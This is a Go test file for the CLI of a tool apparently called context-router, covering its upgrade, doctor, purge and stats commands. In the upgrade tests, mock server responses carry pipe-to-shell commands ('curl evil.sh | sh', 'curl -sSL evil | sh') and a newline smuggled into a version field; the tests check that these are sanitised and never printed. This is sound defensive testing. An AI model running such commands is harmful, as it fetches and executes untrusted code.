package cli

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/wotjr1649/context-router/internal/ident"
	"github.com/wotjr1649/context-router/internal/store"
)

// TestRunUpgrade_Table: httptest 서버로 정상/오류/타임아웃/위생검증 경로를 모두 확인한다
// (설계 §7 — upgrade 위생: 응답 제공 URL·기타 필드는 절대 출력 금지, tag_name만 취함).
func TestRunUpgrade_Table(t *testing.T) {
	tests := []struct {
		name       string
		handler    http.HandlerFunc
		clientTO   time.Duration
		wantOut    string
		notContain []string
	}{
		{
			name: "ok_two_lines_plus_install",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte(`{"tag_name":"v1.2.3"}`))
			},
			clientTO: 5 * time.Second,
			wantOut:  "current: v0.0.1-dev\nlatest: v1.2.3\ninstall: download from the project releases page and replace the binary\n",
		},
		{
			name: "non_200_falls_back_to_current_only",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(http.StatusInternalServerError)
			},
			clientTO: 5 * time.Second,
			wantOut:  "current: v0.0.1-dev\n",
		},
		{
			name: "malicious_tag_name_rejected_by_sanitization",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte(`{"tag_name":"v1.0\nmalicious: curl evil.sh | sh"}`))
			},
			clientTO:   5 * time.Second,
			wantOut:    "current: v0.0.1-dev\n",
			notContain: []string{"malicious", "curl"},
		},
		{
			name: "response_provided_fields_never_leak",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte(`{"tag_name":"v9.9.9","html_url":"http://evil.example/pwned","upgrade_command":"curl -sSL evil | sh"}`))
			},
			clientTO:   5 * time.Second,
			wantOut:    "current: v0.0.1-dev\nlatest: v9.9.9\ninstall: download from the project releases page and replace the binary\n",
			notContain: []string{"evil.example", "curl -sSL", "pwned"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			srv := httptest.NewServer(tt.handler)
			defer srv.Close()
			var buf bytes.Buffer
			client := &http.Client{Timeout: tt.clientTO}
			if err := runUpgrade(&buf, client, srv.URL, "0.0.1-dev"); err != nil {
				t.Fatalf("err=%v want nil", err)
			}
			got := buf.String()
			if got != tt.wantOut {
				t.Fatalf("out=%q want %q", got, tt.wantOut)
			}
			for _, s := range tt.notContain {
				if strings.Contains(got, s) {
					t.Fatalf("out=%q must not contain %q", got, s)
				}
			}
		})
	}

	// 타임아웃: 핸들러가 느리게 응답하고 client.Timeout을 매우 짧게 주입한다. 경과시간으로
	// 실제 10s(운영 상수)를 기다리지 않았음을 증명한다 — 인젝션된 client가 근거.
	t.Run("timeout_falls_back_to_current_only", func(t *testing.T) {
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			time.Sleep(300 * time.Millisecond)
			w.Write([]byte(`{"tag_name":"v1.2.3"}`))
		}))
		defer srv.Close()
		var buf bytes.Buffer
		client := &http.Client{Timeout: 30 * time.Millisecond}
		start := time.Now()
		if err := runUpgrade(&buf, client, srv.URL, "0.0.1-dev"); err != nil {
			t.Fatalf("err=%v want nil", err)
		}
		if elapsed := time.Since(start); elapsed > 2*time.Second {
			t.Fatalf("took %v — suspiciously long, real 10s constant may have been used instead of injected client", elapsed)
		}
		want := "current: v0.0.1-dev\n"
		if buf.String() != want {
			t.Fatalf("out=%q want %q", buf.String(), want)
		}
	})
}

// TestRunDoctor_Smoke: 미생성 storeRoot(부모만 존재) + 임시 프로젝트 디렉터리로 doctor를
// 실행한다. content.db가 없으므로 "not initialized"가 나와야 하고, err=nil이어야 하며,
// doctor는 store를 생성하면 안 된다(no-create, 설계 §7) — storeRoot 자체도, 프로젝트별
// store 디렉터리도 실행 후 여전히 존재하지 않아야 한다.
func TestRunDoctor_Smoke(t *testing.T) {
	base := t.TempDir()
	storeRoot := filepath.Join(base, "storeroot") // 의도적 미생성 — 부모(base)만 존재
	projectRoot := filepath.Join(base, "proj")
	if err := os.MkdirAll(filepath.Join(projectRoot, ".git"), 0o755); err != nil {
		t.Fatalf("mkdir project: %v", err)
	}

	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, canon.ProjectID) {
		t.Fatalf("out missing ProjectID %q: %s", canon.ProjectID, out)
	}
	if !strings.Contains(out, "not initialized") {
		t.Fatalf("out missing 'not initialized': %s", out)
	}
	if !strings.Contains(out, ".mcp.json") {
		t.Fatalf("out missing '.mcp.json' snippet marker: %s", out)
	}

	if _, err := os.Stat(storeRoot); !os.IsNotExist(err) {
		t.Fatalf("store root must not be created by doctor: stat err=%v", err)
	}
	if _, err := os.Stat(filepath.Join(storeRoot, "projects", canon.ProjectID)); !os.IsNotExist(err) {
		t.Fatalf("per-project store dir must not be created by doctor: stat err=%v", err)
	}
}

// TestRunDoctor_InitializedStore: 실제 store.Open(dir,false)+Close로 content.db를 생성한
// 뒤(read-write로 스키마까지 마이그레이션됨) doctor를 read-only로 실행한다. 리뷰에서 발견된
// 버그 — reader가 store.Open(dir,true)의 mode=ro&query_only(ON) 연결이라 예전 fts5 프로브
// (CREATE VIRTUAL TABLE)가 SQLITE_READONLY로 항상 실패하던 것 — 의 회귀를 막는다: err=nil과
// "fts5: 가능" 출력을 직접 검증한다(TestRunDoctor_Smoke는 미초기화 분기만 커버해 이 버그를
// 가렸었다).
func TestRunDoctor_InitializedStore(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	if err := os.MkdirAll(filepath.Join(projectRoot, ".git"), 0o755); err != nil {
		t.Fatalf("mkdir project: %v", err)
	}
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}

	st, err := store.Open(filepath.Join(storeRoot, "projects", canon.ProjectID), false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "user_version=1 quick_check=ok") {
		t.Fatalf("out missing content.db quick_check=ok: %s", out)
	}
	if !strings.Contains(out, "[4] fts5: 가능") {
		t.Fatalf("out missing fts5 available on an initialized (read-only-probed) store: %s", out)
	}
}

// TestRun_UnknownSub: cli의 관심사가 아닌 미지 서브커맨드는 오류를 반환해야 한다 — main이
// 이를 통해 미지 단어를 MCP 플래그로 잘못 흡수하지 않도록 한다(설계 §7).
func TestRun_UnknownSub(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "bogus", nil, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unknown subcommand, got nil")
	}
}

// TestRunPurge_ExactlyOneSelector: --project/--all 중 정확히 하나가 아니면 사용법 오류(설계
// §7). Run을 통해 호출해 dispatch까지 포함해 확인한다 — 비TTY(테스트 프로세스 stdin)라
// --force 미비로도 오류가 나겠지만, 이 값 자체는 selector 검증이 먼저 걸려야 한다.
func TestRunPurge_ExactlyOneSelector(t *testing.T) {
	for _, args := range [][]string{
		{},                          // 둘 다 없음
		{"--project", "x", "--all"}, // 둘 다 있음
	} {
		var out, errOut bytes.Buffer
		err := Run(context.Background(), "purge", args, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
		if err == nil {
			t.Fatalf("args=%v: want selector 오류, got nil", args)
		}
	}
}

// failReader: Read 호출 시 즉시 panic — confirmPurge의 force 경로가 실제로 in을 전혀 읽지
// 않음을 증명하는 용도(읽으면 테스트가 panic으로 즉시 실패한다).
type failReader struct{}

func (failReader) Read([]byte) (int, error) {
	panic("confirmPurge: force 경로에서 입력을 읽으면 안 됩니다")
}

// TestConfirmPurge: 확인 규칙 table-driven(설계 §7 — TTY 필수+슬러그 정확 입력, 정적 "yes"
// 금지, 비TTY는 --force만). confirmPurge는 순수 함수라 os.Stdin 없이 직접 호출한다.
func TestConfirmPurge(t *testing.T) {
	tests := []struct {
		name    string
		in      io.Reader
		isTTY   bool
		force   bool
		wantErr bool
	}{
		{"tty_exact_slug_ok", strings.NewReader("myproj\n"), true, false, false},
		{"tty_wrong_input_rejected", strings.NewReader("nope\n"), true, false, true},
		{"tty_static_yes_rejected", strings.NewReader("yes\n"), true, false, true},
		{"non_tty_without_force_rejected", failReader{}, false, false, true},
		{"non_tty_with_force_ok_and_unread", failReader{}, false, true, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var out bytes.Buffer
			err := confirmPurge(tt.in, &out, tt.isTTY, tt.force, "myproj")
			if (err != nil) != tt.wantErr {
				t.Fatalf("err=%v wantErr=%v", err, tt.wantErr)
			}
		})
	}
}

// TestRunPurge_E2E_OlderThanForce: 임시 store에 source 1건을 등록한 뒤 runPurge를
// --project(경로 형태, purgeProjectID의 Canonicalize 분기까지 exercised) --force
// --older-than 1ns로 호출한다. isTTY는 false로 명시 주입한다 — 이 값은 원래 Run()의 purge
// 분기가 os.Stdin.Stat()으로 판정하지만(테스트 대상 아님, 한 줄짜리 위임), 테스트 프로세스의
// 실제 stdin이 셸/CI 환경에 따라 문자 장치로 보일 수도 있어(이식성 없음) runPurge를 직접
// 호출해 비TTY 경로를 결정적으로 재현한다. 삭제 후 sources/artifacts가 실제로 비어야 한다
// (설계 §7 선택 삭제).
func TestRunPurge_E2E_OlderThanForce(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{StoredBytes: []byte("purge me"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/purge.txt", Kind: "file", SrcHash: "h-purge"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "purge me"}}}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	time.Sleep(1100 * time.Millisecond) // indexed_at은 unix 초 — --older-than 1ns가 실제로 경계를 넘도록

	var out bytes.Buffer
	args := []string{"--project", projectRoot, "--force", "--older-than", "1ns"}
	if err := runPurge(context.Background(), failReader{}, &out, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v out=%s", err, out.String())
	}

	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 0 {
		t.Fatalf("sources=%d want 0(삭제됐어야 함)", n)
	}
	if err := st2.Reader().QueryRow("SELECT count(*) FROM artifacts").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 0 {
		t.Fatalf("artifacts=%d want 0(삭제됐어야 함)", n)
	}
}

// TestRunPurge_E2E_MismatchLeavesDataIntact: TTY 경로에서 확인 슬러그를 잘못 입력하면
// runPurge가 오류를 반환하고 sources/artifacts를 전혀 건드리면 안 된다(설계 §7 — 불일치 시
// 무삭제, self-review 필수 항목). --older-than을 지정하지 않아 전체 삭제(RemoveAll) 분기까지
// 타는 경우도 포함 — 확인 실패 시 그 분기 자체에 도달하면 안 된다는 것까지 증명한다.
func TestRunPurge_E2E_MismatchLeavesDataIntact(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{StoredBytes: []byte("do not touch"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/keep.txt", Kind: "file", SrcHash: "h-keep"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "do not touch"}}}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	var out bytes.Buffer
	args := []string{"--project", canon.ProjectID} // --older-than 미지정 → 성공했다면 전체 삭제였을 경로
	err = runPurge(context.Background(), strings.NewReader("wrong-slug\n"), &out, storeRoot, args, true)
	if err == nil {
		t.Fatal("want error for mismatched confirmation slug, got nil")
	}

	if _, err := os.Stat(projDir); err != nil {
		t.Fatalf("projDir must survive a rejected confirmation: %v", err)
	}
	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 1 {
		t.Fatalf("sources=%d want 1(무삭제)", n)
	}
}

// TestRunPurge_E2E_GCOnlyNoConfirm: --gc 단독(older-than 없음)이면 --force도 TTY도 없이
// 성공해야 하고(확인 생략, 설계 §7), orphan blob만 지우고 참조 중인 source/artifact/blob은
// 전혀 건드리지 않아야 한다.
func TestRunPurge_E2E_GCOnlyNoConfirm(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	body := []byte("kept content")
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{StoredBytes: body, MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/kept.txt", Kind: "file", SrcHash: "h-kept"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: string(body)}}}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	sum := sha256.Sum256(body)
	keptHash := hex.EncodeToString(sum[:])

	orphanHash := strings.Repeat("e", 64)
	orphanDir := filepath.Join(projDir, "artifacts", orphanHash[:2])
	if err := os.MkdirAll(orphanDir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(orphanDir, orphanHash), []byte("orphan"), 0o600); err != nil {
		t.Fatal(err)
	}

	var out, errOut bytes.Buffer
	// --force도 --older-than도 없다 — gc 단독이 확인을 생략하고도 성공해야 한다.
	args := []string{"--project", projectRoot, "--gc"}
	if err := Run(context.Background(), "purge", args, storeRoot, projectRoot, "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run purge --gc err=%v out=%s", err, out.String())
	}

	if _, err := os.Stat(filepath.Join(orphanDir, orphanHash)); !os.IsNotExist(err) {
		t.Fatalf("orphan blob 잔존: err=%v", err)
	}
	if _, err := os.Stat(filepath.Join(projDir, "artifacts", keptHash[:2], keptHash)); err != nil {
		t.Fatalf("참조 blob이 gc-only에 삭제됨: %v", err)
	}
	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 1 {
		t.Fatalf("sources=%d want 1(gc-only는 DB 행을 지우지 않음)", n)
	}
}

// TestRunStats_Local: 임시 store에 LedgerAppend 3건(도구 2종)을 넣고 Run(ctx,"stats",...)을
// 호출해 로컬 ledger 집계 표를 확인한다(설계 §6) — 두 도구명 모두·"bytes suppressed" 고정
// 문구 포함, "token"/"$" 문자열은 어디에도 없어야 한다(토큰·달러 환산·절약률 주장 금지,
// §6 차단 항목).
func TestRunStats_Local(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	st.LedgerAppend("ctr_fetch_and_index", 1000, 20, 5)
	st.LedgerAppend("ctr_fetch_and_index", 500, 30, 4)
	st.LedgerAppend("ctr_search", 50, 500, 3)
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}

	var out, errOut bytes.Buffer
	if err := Run(context.Background(), "stats", nil, storeRoot, projectRoot, "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run stats err=%v out=%s", err, out.String())
	}
	got := out.String()
	for _, want := range []string{"ctr_fetch_and_index", "ctr_search", "bytes suppressed (local, 진단용)"} {
		if !strings.Contains(got, want) {
			t.Fatalf("out missing %q: %s", want, got)
		}
	}
	for _, banned := range []string{"token", "$"} {
		if strings.Contains(got, banned) {
			t.Fatalf("out must not contain %q (환산·절약 금지, 설계 §6): %s", banned, got)
		}
	}
}

// TestRunStats_Local_NoLedger: ledger.db가 아예 없는(=store를 한 번도 연 적 없는) 프로젝트에서도
// stats는 오류 없이 표(빈 본문 + 합계 0줄)를 출력해야 한다 — LedgerStats의 "미존재 → 빈 슬라이스"
// 계약이 cli까지 그대로 이어지는지 확인한다.
func TestRunStats_Local_NoLedger(t *testing.T) {
	var out, errOut bytes.Buffer
	if err := Run(context.Background(), "stats", nil, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run stats err=%v out=%s", err, out.String())
	}
	got := out.String()
	if !strings.Contains(got, "bytes suppressed (local, 진단용)") {
		t.Fatalf("out missing fixed suppression phrase: %s", got)
	}
	for _, banned := range []string{"token", "$"} {
		if strings.Contains(got, banned) {
			t.Fatalf("out must not contain %q: %s", banned, got)
		}
	}
}

// TestRunStats_Provider: 임시 JSONL 3줄(usage 2건 + 파싱 불가 1건)을 스캔해 실측 토큰 합계와
// skipped 카운트를 검증한다(설계 §6 provider 계약) — 절약 주장·비교 문구는 없다(실측 합계만).
func TestRunStats_Provider(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "transcript.jsonl")
	lines := []string{
		`{"message":{"usage":{"input_tokens":100,"output_tokens":20,"cache_read_input_tokens":5,"cache_creation_input_tokens":1}}}`,
		`{"message":{"usage":{"input_tokens":50,"output_tokens":10,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}}`,
		`not valid json`,
	}
	if err := os.WriteFile(path, []byte(strings.Join(lines, "\n")+"\n"), 0o600); err != nil {
		t.Fatalf("write transcript: %v", err)
	}

	var out, errOut bytes.Buffer
	args := []string{"--provider", path}
	if err := Run(context.Background(), "stats", args, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run stats --provider err=%v out=%s", err, out.String())
	}
	got := out.String()
	for _, want := range []string{
		"input_tokens: 150", "output_tokens: 30",
		"cache_read_input_tokens: 5", "cache_creation_input_tokens: 1",
		"skipped: 1",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("out missing %q: %s", want, got)
		}
	}
}

// TestRunStats_Provider_FileMissing: --provider 경로가 없으면 오류를 반환해야 한다(침묵 무시
// 금지). 반환 오류 문구에 그 경로 자체가 섞여선 안 된다(§12 canary, 리뷰 Fix Round 2 Critical
// (a) — os.Open이 반환하는 *fs.PathError는 절대경로를 담는다).
func TestRunStats_Provider_FileMissing(t *testing.T) {
	var out, errOut bytes.Buffer
	missing := filepath.Join(t.TempDir(), "missing.jsonl")
	args := []string{"--provider", missing}
	err := Run(context.Background(), "stats", args, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for missing --provider file, got nil")
	}
	if strings.Contains(err.Error(), missing) {
		t.Fatalf("error must not leak the path: %v", err)
	}
}

// TestRunStats_Local_ProjectIdentifyFailure: projectRoot가 존재하지 않아 ident.Canonicalize가
// 실패하는 경우도 오류를 반환해야 하고, 그 오류 문구에 projectRoot 경로가 섞여선 안 된다
// (§12 canary, 리뷰 Fix Round 2 Critical (b) — Canonicalize의 원인은 *fs.PathError).
func TestRunStats_Local_ProjectIdentifyFailure(t *testing.T) {
	storeRoot := t.TempDir()
	missingProject := filepath.Join(t.TempDir(), "does-not-exist")

	var out, errOut bytes.Buffer
	err := Run(context.Background(), "stats", nil, storeRoot, missingProject, "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for nonexistent project root, got nil")
	}
	if strings.Contains(err.Error(), missingProject) {
		t.Fatalf("error must not leak the path: %v", err)
	}
}

// TestRunStats_Provider_OversizedLine: 10MB(maxProviderLine) 상한을 넘는 한 줄이 있어도 명령
// 전체가 중단되면 안 된다 — 그 줄만 skipped로 세고 그 앞뒤 정상 줄은 계속 합산해야 한다(리뷰
// Fix Round 2, Important-3 — 예전 bufio.Scanner 고정버퍼 구현은 이 경우 Scan() 자체가
// 실패해 명령 전체가 오류로 끝났다). 긴 줄은 strings.Repeat로 생성한다(리터럴 금지).
func TestRunStats_Provider_OversizedLine(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "transcript.jsonl")

	huge := `{"message":{"usage":{"input_tokens":1,"padding":"` + strings.Repeat("x", 11<<20) + `"}}}`
	lines := []string{
		`{"message":{"usage":{"input_tokens":9,"output_tokens":1,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}}`,
		huge,
	}
	if err := os.WriteFile(path, []byte(strings.Join(lines, "\n")+"\n"), 0o600); err != nil {
		t.Fatalf("write transcript: %v", err)
	}

	var out, errOut bytes.Buffer
	args := []string{"--provider", path}
	if err := Run(context.Background(), "stats", args, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run stats --provider err=%v out=%s", err, out.String())
	}
	got := out.String()
	for _, want := range []string{"input_tokens: 9", "output_tokens: 1", "usage records: 1", "skipped: 1"} {
		if !strings.Contains(got, want) {
			t.Fatalf("out missing %q: %s", want, got)
		}
	}
}

// TestRunDoctor_UnexpectedArgs / TestRunUpgrade_UnexpectedArgs: doctor·upgrade는 args를
// 소비하지 않으므로 잔여 인자를 침묵 수용하면 안 된다(리뷰 Fix Round 2, Important-2) —
// 미지 인자가 있으면 명시적으로 오류여야 한다. 오류 문구에는 사용자가 입력한 원문("--bogus")이
// 그대로 에코되면 안 된다(규약 §6, 리뷰 Fix Round 3 item 5 — 개수만 밝힌다).
func TestRunDoctor_UnexpectedArgs(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "doctor", []string{"--bogus"}, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unexpected doctor args, got nil")
	}
	if strings.Contains(err.Error(), "--bogus") {
		t.Fatalf("error must not echo raw user input: %v", err)
	}
}

func TestRunUpgrade_UnexpectedArgs(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "upgrade", []string{"--bogus"}, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unexpected upgrade args, got nil")
	}
	if strings.Contains(err.Error(), "--bogus") {
		t.Fatalf("error must not echo raw user input: %v", err)
	}
}

// TestRunStats_UnexpectedPositionalArg: flag.Parse가 소비하지 못한 위치 인자(예: --provider
// 없이 그냥 파일명만 넘긴 경우)를 침묵 수용하면 안 된다(리뷰 Fix Round 3, item 4).
func TestRunStats_UnexpectedPositionalArg(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "stats", []string{"provider.jsonl"}, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unexpected positional arg, got nil")
	}
	if strings.Contains(err.Error(), "provider.jsonl") {
		t.Fatalf("error must not echo raw user input: %v", err)
	}
}

// TestRunStats_Provider_ContextCanceled: 이미 취소된 ctx로 stats --provider를 호출하면
// 오류로 중단해야 한다(리뷰 Fix Round 3, item 7) — 취소 확인은 cancelCheckLines(256)줄마다
// 이루어지는데, lineNo=0에서 첫 확인이 스캔 시작 전에 실행되므로 파일이 짧아도(1줄) 검증된다.
func TestRunStats_Provider_ContextCanceled(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "transcript.jsonl")
	line := `{"message":{"usage":{"input_tokens":1,"output_tokens":1,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}}` + "\n"
	if err := os.WriteFile(path, []byte(line), 0o600); err != nil {
		t.Fatalf("write transcript: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	var out, errOut bytes.Buffer
	err := Run(ctx, "stats", []string{"--provider", path}, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for canceled context, got nil")
	}
}

// TestRunDoctor_StoreRootDeepMissingParents_Writable: storeRoot의 부모·조부모가 전부
// 미생성이어도(딱 한 단계 위까지도 없는 신규 배치) store.Open의 MkdirAll이 계층 전체를 한
// 번에 만들 수 있으므로 writable=true로 판정해야 한다(리뷰 Fix Round 3, item 2 — 예전
// 구현은 filepath.Dir 한 단계만 봐서 이 경우 항상 writable=false로 오판했다).
func TestRunDoctor_StoreRootDeepMissingParents_Writable(t *testing.T) {
	base := t.TempDir()
	storeRoot := filepath.Join(base, "a", "b", "c") // a,b,c 전부 미생성
	projectRoot := t.TempDir()

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	if !strings.Contains(buf.String(), "[1] store-root: exists=false writable=true") {
		t.Fatalf("out missing writable=true for deep-missing store-root: %s", buf.String())
	}
	if _, err := os.Stat(storeRoot); !os.IsNotExist(err) {
		t.Fatalf("store root must not be created by doctor: stat err=%v", err)
	}
}

// TestRunDoctor_StoreRootIsFile_Rejected: storeRoot 위치에 이미 일반 파일이 있으면
// store.Open의 MkdirAll이 절대 성공할 수 없으므로 프로브 없이 writable=false로 명시
// 거부해야 한다(리뷰 Fix Round 3, item 2).
func TestRunDoctor_StoreRootIsFile_Rejected(t *testing.T) {
	base := t.TempDir()
	storeRoot := filepath.Join(base, "storeroot-is-a-file")
	if err := os.WriteFile(storeRoot, []byte("x"), 0o600); err != nil {
		t.Fatalf("write file: %v", err)
	}
	projectRoot := t.TempDir()

	var buf bytes.Buffer
	err := runDoctor(context.Background(), &buf, storeRoot, projectRoot)
	if err == nil {
		t.Fatal("want error — store-root path is an existing non-directory file")
	}
	if !strings.Contains(buf.String(), "[1] store-root: exists=true writable=false") {
		t.Fatalf("out missing exists=true writable=false: %s", buf.String())
	}
}
